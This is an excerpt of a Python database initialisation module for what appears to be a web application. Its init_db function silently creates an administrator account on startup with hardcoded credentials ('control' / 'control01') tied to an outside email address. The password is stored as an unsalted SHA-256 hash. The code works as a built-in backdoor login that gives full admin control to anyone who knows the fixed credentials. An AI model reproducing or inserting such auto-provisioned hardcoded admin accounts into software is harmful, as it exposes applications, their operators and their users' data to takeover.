...
DATABASE_URL = os.getenv(
    "DATABASE_URL",
    "sqlite:///./giawestllc.db"  # SQLite for local development
)
...
def init_db():
    ...
    try:
        # Note: If using PostgreSQL, this might need more robust migration
    ...
    # Auto-provision the requested admin account
    try:
        import hashlib
        ...
        username = "control"
        password = "control01"
        email = "floridaprod@proton.me"
        
        existing = db.query(Admin).filter(Admin.username == username).first()
        if not existing:
            logger.info(f"Auto-provisioning admin account: {username}")
            password_hash = hashlib.sha256(password.encode()).hexdigest()
            new_admin = Admin(
                username=username,
                email=email,
                password_hash=password_hash,
                full_name="Florida Prod Market Admin Control",
                role="admin"
            )
            db.add(new_admin)
            db.commit()
        ...
        logger.warning(f"Could not auto-provision admin account: {e}")
